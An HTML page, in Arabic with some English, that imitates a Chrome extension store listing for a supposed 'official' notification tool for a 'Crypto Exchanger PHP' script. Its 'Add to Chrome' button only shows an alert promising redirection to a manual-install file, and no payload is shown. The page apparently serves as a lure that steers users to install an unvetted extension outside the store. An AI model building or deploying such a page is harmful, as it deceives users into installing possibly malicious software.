<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Allow notifications for messages</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 800px;
      margin: 40px auto;
      padding: 20px;
      text-align: center;
    }

    .extension-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 30px;
    }

    .extension-info {
      text-align: left;
    }

    .extension-icon {
      width: 120px;
      height: 120px;
      border-radius: 20px;
    }

    h1 {
      font-size: 24px;
      margin: 10px 0 5px;
    }

    .add-button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }

    .add-button:hover {
      background-color: #1669c1;
    }

    .previews {
      margin-top: 40px;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    .previews img {
      width: 320px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="extension-header">
      <img src="icon.png" alt="Extension Icon" class="extension-icon">
      <div class="extension-info">
        <h1>تفعيل الإشعارات</h1>
        <p>أداة رسمية لعرض إشعارات سكربت Crypto Exchanger PHP.</p>
      </div>
      <button class="add-button" onclick="alert('سيتم توجيهك إلى ملف الإضافة لتثبيتها يدويًا.')">
        Add to Chrome
      </button>
    </div>

    <div class="previews">
      <img src="preview1.png" alt="Preview 1">
      <img src="preview2.png" alt="Preview 2">
    </div>
  </div>

</body>
</html>
